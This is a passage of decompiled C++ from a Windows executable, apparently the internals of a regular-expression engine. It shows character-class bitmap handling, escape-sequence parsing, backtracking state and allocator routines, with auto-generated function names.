  iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
  iVar1 = *(int *)(iVar2 + 0x12 + *param_1);
  iVar2 = iVar2 + *param_1;
  if (param_2 == iVar1) {
    uVar3 = (**(code **)**(undefined4 **)(*(int *)((int)this + 8) + 4))(param_1,param_2);
  }
  else {
    *(undefined4 *)(iVar2 + 0x12) = *(undefined4 *)(iVar2 + 0x16);
    *(int *)(*(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) =
         param_2;
    uVar4 = FUN_00413d2d(*(void **)((int)this + 8),param_1,param_2);
    if ((char)uVar4 == '\0') {
      iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
      *(undefined4 *)(iVar2 + 0x16) = *(undefined4 *)(iVar2 + 0x12);
      uVar3 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
      *(int *)(uVar3 + 0x12 + *param_1) = iVar1;
      uVar3 = uVar3 & 0xffffff00;
    }
    else {
      uVar3 = CONCAT31((int3)((uint)uVar4 >> 8),1);
    }
  }
  return uVar3;
}



uint __thiscall FUN_0040b93a(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  
  iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
  iVar1 = *(int *)(iVar2 + 0x12 + *param_1);
  iVar2 = iVar2 + *param_1;
  if (param_2 == iVar1) {
    uVar3 = (**(code **)(**(int **)(*(int *)((int)this + 8) + 4) + 4))(param_1,param_2);
  }
  else {
    *(undefined4 *)(iVar2 + 0x12) = *(undefined4 *)(iVar2 + 0x16);
    *(int *)(*(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) =
         param_2;
    uVar4 = FUN_00413da0(*(void **)((int)this + 8),param_1,param_2);
    if ((char)uVar4 == '\0') {
      iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
      *(undefined4 *)(iVar2 + 0x16) = *(undefined4 *)(iVar2 + 0x12);
      uVar3 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
      *(int *)(uVar3 + 0x12 + *param_1) = iVar1;
      uVar3 = uVar3 & 0xffffff00;
    }
    else {
      uVar3 = CONCAT31((int3)((uint)uVar4 >> 8),1);
    }
  }
  return uVar3;
}



void __fastcall FUN_0040b9ca(void *param_1)

{
  FUN_0040c040(param_1,*(int *)((int)param_1 + 0x418) + -4);
  return;
}



void __thiscall FUN_0040b9dc(void *this,undefined4 *param_1)

{
  int iVar1;
  
  iVar1 = *(int *)((int)this + 0x418);
  *param_1 = *(undefined4 *)(iVar1 + -0xc);
  param_1[1] = *(undefined4 *)(iVar1 + -8);
  *(undefined *)(param_1 + 2) = *(undefined *)(iVar1 + -4);
  FUN_0040c040(this,(int)(undefined4 *)(iVar1 + -0xc));
  return;
}



void __thiscall FUN_0040b9fb(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  
  puVar1 = (undefined4 *)(*(int *)((int)this + 0x418) + -0x1c);
  puVar3 = puVar1;
  for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {
    *param_1 = *puVar3;
    puVar3 = puVar3 + 1;
    param_1 = param_1 + 1;
  }
  *(undefined2 *)param_1 = *(undefined2 *)puVar3;
  FUN_0040c040(this,(int)puVar1);
  return;
}



int __fastcall FUN_0040ba22(int param_1)

{
  return *(int *)(param_1 + 0x418) + -4;
}



void __thiscall FUN_0040ba2e(void *this,undefined4 *param_1)

{
  int iVar1;
  
  iVar1 = *(int *)((int)this + 0x418);
  *param_1 = *(undefined4 *)(iVar1 + -0x10);
  param_1[1] = *(undefined4 *)(iVar1 + -0xc);
  param_1[2] = *(undefined4 *)(iVar1 + -8);
  *(undefined *)(param_1 + 3) = *(undefined *)(iVar1 + -4);
  FUN_0040c040(this,(int)(undefined4 *)(iVar1 + -0x10));
  return;
}



void __thiscall FUN_0040ba4e(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_0040c014(this,4);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = *param_1;
  }
  return;
}



void __fastcall FUN_0040ba64(int param_1)

{
  undefined4 uVar1;
  int iVar2;
  ushort *puVar3;
  ushort *puVar4;
  ushort *puVar5;
  ushort *puVar6;
  
  puVar4 = *(ushort **)(param_1 + 1);
  *(undefined4 *)(param_1 + 1) = 0;
  do {
    if (puVar4 == (ushort *)0x0) {
      return;
    }
    puVar6 = *(ushort **)(param_1 + 1);
    puVar3 = (ushort *)0x0;
    puVar5 = puVar6;
    if (puVar6 == (ushort *)0x0) {
LAB_0040baa3:
      *(ushort **)(param_1 + 1) = puVar4;
      puVar4 = *(ushort **)(puVar4 + 2);
      iVar2 = *(int *)(param_1 + 1);
    }
    else {
      do {
        uVar1 = FUN_00413e15(puVar4,puVar5);
        puVar6 = puVar5;
        if ((char)uVar1 != '\0') break;
        puVar6 = *(ushort **)(puVar5 + 2);
        puVar3 = puVar5;
        puVar5 = puVar6;
      } while (puVar6 != (ushort *)0x0);
      if (puVar3 == (ushort *)0x0) goto LAB_0040baa3;
      *(ushort **)(puVar3 + 2) = puVar4;
      puVar4 = *(ushort **)(puVar4 + 2);
      iVar2 = *(int *)(puVar3 + 2);
    }
    *(ushort **)(iVar2 + 4) = puVar6;
  } while( true );
}



void __thiscall FUN_0040bad5(void *this,undefined *param_1)

{
  *(undefined *)this = *param_1;
  *param_1 = 0;
  *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040baeb(undefined4 *param_1)

{
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 uStack_8;
  
  puStack_c = &LAB_00415bc8;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  *param_1 = &DAT_004177dc;
  uStack_8 = 0;
  if ((int *)param_1[1] != (int *)0x0) {
    (**(code **)(*(int *)param_1[1] + 0x18))(1);
  }
  *param_1 = &DAT_00417810;
  ExceptionList = pvStack_10;
  return;
}



basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall
FUN_0040baf0(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)this,
             param_1,0,*(uint *)npos_exref);
  *(undefined4 *)((int)this + 0x10) = *(undefined4 *)(param_1 + 0x10);
  *(undefined4 *)((int)this + 0x14) = *(undefined4 *)(param_1 + 0x14);
  return (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)this;
}



int __thiscall FUN_0040bb1b(void *this,int param_1)

{
  uint uVar1;
  int iVar2;
  short sVar3;
  uint *puVar4;
  uint *puVar5;
  int iVar6;
  undefined4 *puVar7;
  undefined2 *puVar8;
  short *psVar9;
  
  iVar2 = param_1;
  if (*(char *)(param_1 + 4) == '\0') {
    puVar4 = (uint *)((int)this + 6);
    puVar5 = (uint *)(param_1 + 6);
    iVar6 = 8;
    do {
      uVar1 = *puVar5;
      puVar5 = puVar5 + 1;
      *puVar4 = *puVar4 | uVar1;
      puVar4 = puVar4 + 1;
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
    for (puVar7 = *(undefined4 **)(param_1 + 0x29); puVar7 != (undefined4 *)0x0;
        puVar7 = (undefined4 *)puVar7[1]) {
      FUN_00407c9d((void *)((int)this + 0x28),puVar7);
    }
    *(ushort *)((int)this + 0x26) = *(ushort *)((int)this + 0x26) | *(ushort *)(iVar2 + 0x26);
    for (puVar8 = *(undefined2 **)(iVar2 + 0x2e); puVar8 != (undefined2 *)0x0;
        puVar8 = *(undefined2 **)(puVar8 + 1)) {
      FUN_0040bd58((void *)((int)this + 0x30),puVar8);
    }
    for (puVar7 = *(undefined4 **)(iVar2 + 0x33); puVar7 != (undefined4 *)0x0;
        puVar7 = (undefined4 *)puVar7[1]) {
      FUN_00407c9d((void *)((int)this + 0x38),puVar7);
    }
  }
  else if (((*(short *)(param_1 + 0x26) == 0) && (*(int *)(param_1 + 0x2e) == 0)) &&
          (*(int *)(param_1 + 0x33) == 0)) {
    param_1 = param_1 + 6;
    FUN_0040bc21((void *)((int)this + 6),&param_1);
    psVar9 = *(short **)(iVar2 + 0x29);
    sVar3 = 0xff;
    if (psVar9 != (short *)0x0) {
      do {
        if (*psVar9 != 0x100) {
          param_1 = CONCAT22(*psVar9 + -1,sVar3 + 1);
          FUN_00407c9d((void *)((int)this + 0x28),&param_1);
        }
        sVar3 = psVar9[1];
        psVar9 = *(short **)(psVar9 + 2);
      } while (psVar9 != (short *)0x0);
      if (sVar3 == -1) {
        return (int)this;
      }
    }
    param_1 = CONCAT22(0xffff,sVar3 + 1);
    FUN_00407c9d((void *)((int)this + 0x28),&param_1);
  }
  else {
    FUN_00407c9d((void *)((int)this + 0x38),&param_1);
  }
  return (int)this;
}



void __thiscall FUN_0040bc21(void *this,int *param_1)

{
  int iVar1;
  
  iVar1 = 0;
  do {
    *(uint *)(iVar1 + (int)this) = *(uint *)(iVar1 + (int)this) | ~*(uint *)(*param_1 + iVar1);
    iVar1 = iVar1 + 4;
  } while (iVar1 < 0x20);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_0040bc3e(void *this,byte param_1,uint param_2,char param_3)

{
  uint *puVar1;
  size_t sVar2;
  uint uVar3;
  uint uVar4;
  undefined *local_3c [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_20 [16];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415fad;
  local_10 = ExceptionList;
  if (param_1 <= (byte)param_2) {
    if (param_3 == '\0') {
      for (uVar4 = (uint)param_1; uVar4 <= (param_2 & 0xff); uVar4 = uVar4 + 1) {
        puVar1 = (uint *)((int)this + ((uVar4 & 0xff) >> 5) * 4 + 6);
        *puVar1 = *puVar1 | 1 << (sbyte)((ulonglong)(uVar4 & 0xff) % 0x20);
      }
    }
    else {
      ExceptionList = &local_10;
      for (uVar4 = (uint)param_1; uVar4 <= (param_2 & 0xff); uVar4 = uVar4 + 1) {
        param_1 = (byte)uVar4;
        uVar3 = toupper((int)(char)param_1);
        puVar1 = (uint *)((int)this + ((uVar3 & 0xff) >> 5) * 4 + 6);
        *puVar1 = *puVar1 | 1 << (sbyte)((ulonglong)(uVar3 & 0xff) % 0x20);
        uVar3 = tolower((int)(char)param_1);
        puVar1 = (uint *)((int)this + ((uVar3 & 0xff) >> 5) * 4 + 6);
        *puVar1 = *puVar1 | 1 << (sbyte)((ulonglong)(uVar3 & 0xff) % 0x20);
      }
    }
    ExceptionList = local_10;
    return;
  }
  local_20[0] = param_2._3_1_;
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_20,false);
  sVar2 = strlen(s_invalid_range_specified_in_chara_0041c4d4);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (local_20,s_invalid_range_specified_in_chara_0041c4d4,sVar2);
  local_8 = 0;
  std::logic_error::logic_error((logic_error *)local_3c,local_20);
  local_3c[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_3c,(ThrowInfo *)&DAT_004196f8);
}



void __thiscall FUN_0040bd58(void *this,undefined2 *param_1)

{
  undefined4 *puVar1;
  undefined2 local_a;
  undefined2 uStack_8;
  
                    // WARNING: Load size is inaccurate
  puVar1 = (undefined4 *)FUN_0040507f(*this,6);
  local_a = (undefined2)*(undefined4 *)((int)this + 4);
  uStack_8 = (undefined2)((uint)*(undefined4 *)((int)this + 4) >> 0x10);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = CONCAT22(local_a,*param_1);
    *(undefined2 *)(puVar1 + 1) = uStack_8;
  }
  *(undefined4 **)((int)this + 4) = puVar1;
  return;
}



int FUN_0040bd91(char **param_1,char *param_2)

{
  char cVar1;
  char **ppcVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char **ppcVar6;
  int iStack_14;
  
  ppcVar2 = param_1;
  iVar3 = 0;
  pcVar4 = *param_1;
  cVar1 = *pcVar4;
  if (cVar1 == '-') {
    iStack_14 = 0x2f;
  }
  else {
    if (cVar1 == '[') {
      *param_1 = pcVar4 + 1;
      cVar1 = pcVar4[1];
      *param_1 = pcVar4;
      if (cVar1 != ':') {
        return 0;
      }
      param_1 = (char **)0x0;
      ppcVar6 = (char **)&DAT_00418838;
      do {
        if (DAT_00418830 <= param_1) {
          return iVar3;
        }
        pcVar5 = *ppcVar2;
        for (pcVar4 = *ppcVar6; (param_2 != pcVar5 && (*pcVar4 != '\0')); pcVar4 = pcVar4 + 1) {
          if (*pcVar5 != *pcVar4) goto LAB_0040be69;
          pcVar5 = pcVar5 + 1;
        }
        if (*pcVar4 == '\0') {
          iVar3 = (int)param_1 + 0x32;
          *ppcVar2 = ppcVar6[1] + (int)*ppcVar2;
        }
LAB_0040be69:
        param_1 = (char **)((int)param_1 + 1);
        ppcVar6 = ppcVar6 + 2;
        if (iVar3 != 0) {
          return iVar3;
        }
      } while( true );
    }
    if (cVar1 == '\\') {
      pcVar4 = pcVar4 + 1;
      *param_1 = pcVar4;
      if (param_2 == pcVar4) {
        return 0x2e;
      }
      cVar1 = *pcVar4;
      if (cVar1 == 'D') {
        iStack_14 = 0x14;
      }
      else if (cVar1 == 'S') {
        iStack_14 = 0x16;
      }
      else if (cVar1 == 'W') {
        iStack_14 = 0x18;
      }
      else if (cVar1 == 'b') {
        iStack_14 = 0x30;
      }
      else if (cVar1 == 'd') {
        iStack_14 = 0x13;
      }
      else if (cVar1 == 's') {
        iStack_14 = 0x15;
      }
      else {
        if (cVar1 != 'w') {
          return 0x2e;
        }
        iStack_14 = 0x17;
      }
    }
    else if (cVar1 == ']') {
      iStack_14 = 0x31;
    }
    else {
      if (cVar1 != '^') {
        return 0;
      }
      iStack_14 = 0x2d;
    }
  }
  *param_1 = pcVar4 + 1;
  return iStack_14;
}



void __thiscall FUN_0040be82(void *this,int *param_1)

{
  int *piVar1;
  void *this_00;
  undefined4 uVar2;
  undefined4 *puVar3;
  
  this_00 = (void *)param_1[8];
  if (*(int *)((int)this + 0x10) != -1) {
    piVar1 = (int *)(*(int *)((int)this + 0x10) * 0x1a + 9 + *param_1);
    FUN_0040ba4e(this_00,piVar1);
    *piVar1 = param_1[2];
  }
  uVar2 = *(undefined4 *)((int)this + 0xc);
  puVar3 = (undefined4 *)FUN_0040c014(this_00,4);
  if (puVar3 != (undefined4 *)0x0) {
    *puVar3 = uVar2;
  }
  return;
}



void FUN_0040bec6(int *param_1)

{
  void *this;
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = *param_1;
  this = (void *)param_1[8];
  iVar2 = param_1[3] * 0x1a + iVar3;
  if (iVar2 != iVar3) {
    puVar1 = (undefined4 *)(iVar3 + 9);
    do {
      FUN_0040ba4e(this,puVar1);
      iVar3 = iVar3 + 0x1a;
      puVar1 = (undefined4 *)((int)puVar1 + 0x1a);
    } while (iVar3 != iVar2);
  }
  return;
}



void FUN_0040befb(int *param_1)

{
  int iVar1;
  void *this;
  undefined4 *puVar2;
  int iVar3;
  
  iVar1 = *param_1;
  this = (void *)param_1[8];
  iVar3 = param_1[3] * 0x1a + iVar1;
  if (iVar3 != iVar1) {
    puVar2 = (undefined4 *)(iVar3 + 9);
    do {
      puVar2 = (undefined4 *)((int)puVar2 + -0x1a);
      iVar3 = iVar3 + -0x1a;
      FUN_00413b05(this,puVar2);
    } while (iVar3 != iVar1);
  }
  return;
}



void __thiscall FUN_0040bf30(void *this,int *param_1)

{
  void *this_00;
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
  puVar3 = (undefined4 *)(*(int *)((int)this + 0x25) * 0x1a + *param_1);
  this_00 = (void *)param_1[8];
  puVar4 = (undefined4 *)(*(int *)((int)this + 0x29) * 0x1a + (int)puVar3);
  for (; puVar4 != puVar3; puVar3 = (undefined4 *)((int)puVar3 + 0x1a)) {
    puVar1 = (undefined4 *)FUN_0040c014(this_00,0x1c);
    if (puVar1 != (undefined4 *)0x0) {
      puVar5 = puVar3;
      for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar1 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar1 = puVar1 + 1;
      }
      *(undefined2 *)puVar1 = *(undefined2 *)puVar5;
    }
  }
  FUN_0040ba4e(this_00,param_1 + 2);
  return;
}



char * __thiscall FUN_0040bf91(void *this,char *param_1)

{
  int *piVar1;
  
  if ((char *)this != param_1) {
    piVar1 = *(int **)((int)this + 4);
    if (piVar1 == *(int **)(param_1 + 4)) {
      if (*param_1 != '\0') {
        *(undefined *)this = 1;
      }
    }
    else {
                    // WARNING: Load size is inaccurate
      if ((*this != '\0') && (piVar1 != (int *)0x0)) {
        (**(code **)(*piVar1 + 0x18))(1);
      }
      *(char *)this = *param_1;
    }
    *param_1 = '\0';
    *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  }
  return (char *)this;
}



char * __thiscall FUN_0040bfd3(void *this,char *param_1)

{
  undefined4 *puVar1;
  
  if ((char *)this != param_1) {
    puVar1 = *(undefined4 **)((int)this + 4);
    if (puVar1 == *(undefined4 **)(param_1 + 4)) {
      if (*param_1 != '\0') {
        *(undefined *)this = 1;
      }
    }
    else {
                    // WARNING: Load size is inaccurate
      if ((*this != '\0') && (puVar1 != (undefined4 *)0x0)) {
        (**(code **)*puVar1)(1);
      }
      *(char *)this = *param_1;
    }
    *param_1 = '\0';
    *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  }
  return (char *)this;
}



void __thiscall FUN_0040c014(void *this,uint param_1)

{
  uint uVar1;
  uint uVar2;
  
  uVar2 = *(uint *)((int)this + 0x418);
  uVar1 = uVar2 + param_1;
  *(uint *)((int)this + 0x418) = uVar1;
  if (*(uint *)((int)this + 0x41c) < uVar1) {
    *(uint *)((int)this + 0x418) = uVar2;
    FUN_0040e006(this,param_1);
  }
  return;
}



void __thiscall FUN_0040c040(void *this,int param_1)

{
  int iVar1;
  
  *(int *)((int)this + 0x418) = param_1;
  if (param_1 == *(int *)((int)this + 0x414)) {
    *(int *)(*(int *)((int)this + 0x410) + 8) = param_1;
    iVar1 = **(int **)((int)this + 0x410);
    *(int *)((int)this + 0x410) = iVar1;
    *(int *)((int)this + 0x414) = iVar1 + 0x10;
    *(undefined4 *)((int)this + 0x418) = *(undefined4 *)(*(int *)((int)this + 0x410) + 8);
    *(undefined4 *)((int)this + 0x41c) = *(undefined4 *)(*(int *)((int)this + 0x410) + 0xc);
  }
  return;
}



void __thiscall FUN_0040c0a2(void *this,int *param_1,undefined4 param_2)

{
  FUN_00413e3e(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040c0b7(void *this,int *param_1,undefined4 param_2)

{
  FUN_00413e77(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040c0cc(void *this,int *param_1)

{
  FUN_00413eb1(this,param_1);
  return;
}



uint FUN_0040c0de(int param_1)

{
  uint uVar1;
  
  uVar1 = FUN_00414be8(*(void **)(param_1 + 0x20),(undefined *)((int)&param_1 + 3));
  return uVar1 & 0xffffff00;
}



void __thiscall FUN_0040c0f6(void *this,uint *param_1,int param_2)

{
  void **ppvVar1;
  uint *puVar2;
  uint *puVar3;
  uint uVar4;
  uint uVar5;
  int local_1c [2];
  uint local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  ppvVar1 = *(void ***)((int)this + 0xc);
  puVar2 = (uint *)FUN_00407c0e(*ppvVar1,(int *)&local_14,param_2);
  local_c = *puVar2;
  ppvVar1 = (void **)ppvVar1[1];
  uVar4 = puVar2[1];
  local_8 = uVar4;
  if (ppvVar1 == (void **)0x0) {
    uVar5 = 0;
  }
  else {
    puVar3 = (uint *)FUN_00407c0e(*ppvVar1,local_1c,param_2);
    local_14 = *puVar3;
    puVar2 = &local_c;
    local_10 = puVar3[1];
    if (*puVar3 <= local_c) {
      puVar2 = &local_14;
    }
    uVar5 = *puVar2;
    local_c = uVar5;
    puVar2 = &local_8;
    if (uVar4 <= puVar3[1]) {
      puVar2 = &local_10;
    }
    uVar4 = *puVar2;
  }
  FUN_0040c185((uint *)((int)this + 0x30),*(int *)(param_2 + 4));
  *(uint *)((int)this + 0x14) = uVar5;
  *(uint *)((int)this + 0x18) = uVar4;
  *param_1 = uVar5;
  param_1[1] = uVar4;
  return;
}



void __cdecl FUN_0040c185(uint *param_1,int param_2)

{
  int *piVar1;
  
  piVar1 = (int *)**(int **)(param_2 + 4);
  if (*(int **)(param_2 + 4) != piVar1) {
    do {
      if (*param_1 < (uint)piVar1[2]) {
        return;
      }
      *param_1 = *param_1 + 1;
      piVar1 = (int *)*piVar1;
    } while ((int *)*(int *)(param_2 + 4) != piVar1);
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int __thiscall FUN_0040c1aa(void *this,int param_1,void **param_2)

{
  undefined4 *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415fc0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(bool *)this = param_1 != 0;
  *(int *)((int)this + 4) = param_1;
  local_8 = 0;
  puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    puVar1[1] = 0;
    *puVar1 = &DAT_004177a8;
  }
  *(undefined4 **)(param_1 + 4) = puVar1;
  ExceptionList = local_10;
  return (int)this;
}



undefined4 * __thiscall
FUN_0040c200(void *this,undefined4 param_1,char param_2,undefined4 param_3,undefined4 *param_4)

{
  char cVar1;
  
  FUN_00409194(this,param_1,param_4);
  cVar1 = param_2;
  param_2 = '\0';
  *(char *)((int)this + 0x30) = cVar1;
  *(undefined4 *)((int)this + 0x34) = param_3;
  *(undefined **)this = &DAT_00417ed0;
  FUN_00406ed3(&param_2);
  return (undefined4 *)this;
}



void __thiscall FUN_0040c236(void *this,undefined4 param_1,undefined4 param_2)

{
  FUN_00413f14(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040c24b(void *this,undefined4 param_1,undefined4 param_2)

{
  FUN_00413f4d(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040c260(void *this,uint param_1)

{
  FUN_00413f88(this,param_1);
  return;
}



void __thiscall FUN_0040c272(void *this,uint param_1)

{
  FUN_00413fe4(this,param_1);
  return;
}



void __thiscall FUN_0040c284(void *this,int param_1)

{
  FUN_00414040(this,param_1);
  return;
}



void __thiscall FUN_0040c296(void *this,int param_1)

{
  FUN_0041406d(this,param_1);
  return;
}



void __thiscall FUN_0040c2a8(void *this,uint *param_1,undefined4 param_2)

{
  void **ppvVar1;
  uint *puVar2;
  uint *puVar3;
  uint uVar4;
  uint uVar5;
  int local_1c [2];
  uint local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  ppvVar1 = *(void ***)((int)this + 0xc);
  puVar2 = (uint *)FUN_00407c0e(*ppvVar1,(int *)&local_14,param_2);
  local_c = *puVar2;
  ppvVar1 = (void **)ppvVar1[1];
  uVar4 = puVar2[1];
  local_8 = uVar4;
  if (ppvVar1 == (void **)0x0) {
    uVar5 = 0;
  }
  else {
    puVar3 = (uint *)FUN_00407c0e(*ppvVar1,local_1c,param_2);
    local_14 = *puVar3;
    puVar2 = &local_c;
    local_10 = puVar3[1];
    if (*puVar3 <= local_c) {
      puVar2 = &local_14;
    }
    uVar5 = *puVar2;
    local_c = uVar5;
    puVar2 = &local_8;
    if (uVar4 <= puVar3[1]) {
      puVar2 = &local_10;
    }
    uVar4 = *puVar2;
  }
  (**(code **)(**(int **)((int)this + 0x34) + 0x2c))(local_1c,param_2);
  *(uint *)((int)this + 0x14) = uVar5;
  *(uint *)((int)this + 0x18) = uVar4;
  *param_1 = uVar5;
  param_1[1] = uVar4;
  return;
}



undefined4 __thiscall FUN_0040c461(void *this,int param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_0041409a(param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040c495(void *this,undefined4 param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_004140ba(param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040c54d(void *this,undefined4 param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_004140d5(param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __fastcall FUN_0040c5ed(char *param_1)

{
  if ((*param_1 != '\0') && (*(undefined4 **)(param_1 + 4) != (undefined4 *)0x0)) {
    (**(code **)**(undefined4 **)(param_1 + 4))(1);
  }
  return;
}



undefined4 * __thiscall FUN_0040c600(void *this,char param_1,undefined4 param_2)

{
  char cVar1;
  
  cVar1 = param_1;
  param_1 = '\0';
  *(undefined4 *)((int)this + 4) = 0;
  *(char *)((int)this + 8) = cVar1;
  *(undefined4 *)((int)this + 0xc) = param_2;
  *(undefined **)this = &DAT_00417f0c;
  FUN_0040c5ed(&param_1);
  return (undefined4 *)this;
}



undefined4 * __thiscall
FUN_0040c62f(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00417f40;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00417f74;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



uint __thiscall FUN_0040c6f8(void *this,int param_1,int *param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  puVar2 = (undefined *)*param_2;
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414c04(*(void **)((int)this + 0xc),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



void __thiscall FUN_0040c728(void *this,undefined4 param_1,char **param_2)

{
  FUN_004140ea(this,param_1,param_2);
  return;
}



uint __thiscall FUN_0040c73d(void *this,int param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  puVar2 = *(undefined **)(param_1 + 8);
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414c04(*(void **)((int)this + 0xc),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



void __thiscall FUN_0040c772(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_004140ea(this,param_1,(char **)(param_1 + 8));
  return;
}



undefined4 * __thiscall FUN_0040c79b(void *this,char param_1,undefined4 param_2)

{
  char cVar1;
  
  cVar1 = param_1;
  param_1 = '\0';
  *(undefined4 *)((int)this + 4) = 0;
  *(char *)((int)this + 8) = cVar1;
  *(undefined4 *)((int)this + 0xc) = param_2;
  *(undefined **)this = &LAB_00417fa8;
  FUN_0040c5ed(&param_1);
  return (undefined4 *)this;
}



undefined4 * __thiscall
FUN_0040c7ca(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00417fdc;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418010;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



